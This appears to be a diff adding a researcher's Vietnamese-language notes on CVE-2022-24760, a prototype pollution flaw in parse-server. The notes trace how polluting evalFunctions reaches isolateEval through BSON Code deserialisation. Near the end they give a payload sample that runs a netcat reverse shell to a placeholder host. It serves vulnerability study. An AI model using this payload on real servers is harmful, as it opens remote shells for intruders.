@@ -1,0 +1,66 @@
+### [CVE-2022-24760](https://github.com/tuo4n8/CVE-2022-24760-Analysis)
+
+---
+
+### flow
+
+![image-20220331114046018](take-note.assets/image-20220331114046018.png)
+
+![image-20220331114258164](take-note.assets/image-20220331114258164.png)
+
+- Default không cần key để thêm xóa sửa các class vào db
+
+![image-20220331115258271](take-note.assets/image-20220331115258271.png)
+
+---
+
+### Diff commit
+
+https://github.com/parse-community/parse-server/commit/886bfd7cac69496e3f73d4bb536f0eec3cba0e4d
+
+![image-20220331132344135](take-note.assets/image-20220331132344135.png)
+
+- Prototype pollution xảy ra ở hàm `expandResultOnKeyPath` 
+
+```
+DatabaseController.js
+	sanitizeDatabaseResult
+		-> expandResultOnKeyPath
+```
+
+- `sanitizeDatabaseResult` được sử dụng khi `add` và `update` class mới. Tuy nhiên để prototype được phải thõa mãn điều khiện khi keyUpdate `__op` thuộc `['Add', 'AddUnique', 'Remove', 'Increment']`
+- Do đó, các value prototype chỉ có thể là `array` hoặc là `number` 
+  - ![image-20220331132813075](take-note.assets/image-20220331132813075.png)
+  - ![image-20220331132823843](take-note.assets/image-20220331132823843.png)
+
+- sample resquest like:
+
+![image-20220331133133587](take-note.assets/image-20220331133133587.png)
+
+### Sink exploit for RCE
+
+- Trước khi lưu dữ liệu trên DB, luồng dữ liệu sẽ được `serialize` qua thư viện BSON, khi _bsontype là `Code` thì sẽ tiến hành `serializeCode` 
+
+![image-20220331133328243](take-note.assets/image-20220331133328243.png)
+
+​								`parse-server-4.10.6/node_modules/bson/lib/bson/parser/serializer.js:762`
+
+- Sau đó, dữ liệu sẽ được deserialize để thao tác đi đến sink:
+
+![image-20220331145339371](take-note.assets/image-20220331145339371.png)
+
+![image-20220331145403962](take-note.assets/image-20220331145403962.png)
+
+![image-20220331145421339](take-note.assets/image-20220331145421339.png)
+
+- Sử dụng prototype pollution để pollute `options['evalFunctions']` -> bypass đến hàm `isolateEval`
+- Payload sample
+
+```
+"_bsontype":"Code","code":"asdasd;require('child_process').exec('rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f')"
+```
+
+- Do luồng thực thi hàm `expandResultOnKeyPath` đến sau khi deserilize nên cần thực hiện race condtion liên tục để khi đến `isolateEval` có thể trigger được
+
+![image-20220331145825647](take-note.assets/image-20220331145825647.png)
+
